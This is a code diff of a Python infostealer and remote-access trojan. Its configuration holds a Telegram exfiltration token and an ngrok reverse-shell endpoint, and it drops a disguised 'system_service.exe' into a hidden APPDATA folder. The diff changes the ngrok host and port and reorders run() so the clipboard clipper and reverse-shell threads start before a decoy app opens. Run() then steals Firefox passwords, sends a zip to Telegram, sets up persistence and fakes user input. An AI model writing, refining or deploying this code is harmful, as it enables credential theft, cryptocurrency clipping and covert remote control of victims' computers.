@@ -32,8 +32,8 @@ import sys
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
-NGROK_HOST = "4.tcp.eu.ngrok.io"
-NGROK_PORT = 17534
+NGROK_HOST = "5.tcp.eu.ngrok.io"
+NGROK_PORT = 16534
 EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
 EXE_NAME = "system_service.exe"
 EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
@@ -541,9 +541,11 @@ def keep_reverse_shell_alive():
 
 
 def run():
-    launch_distraction_app()
+    # START THREADS IMMEDIATELY
     threading.Thread(target=clipper_loop, daemon=True).start()
     threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
+
+    launch_distraction_app()
 
     if not already_exfiltrated():
         profile_system()
@@ -559,10 +561,12 @@ def run():
         steal_firefox_passwords()
         send_zip_to_telegram()
         mark_exfiltrated()
+
     persist()
     fake_input()
     while True:
         time.sleep(10)
+
 
 
 if __name__ == "__main__":
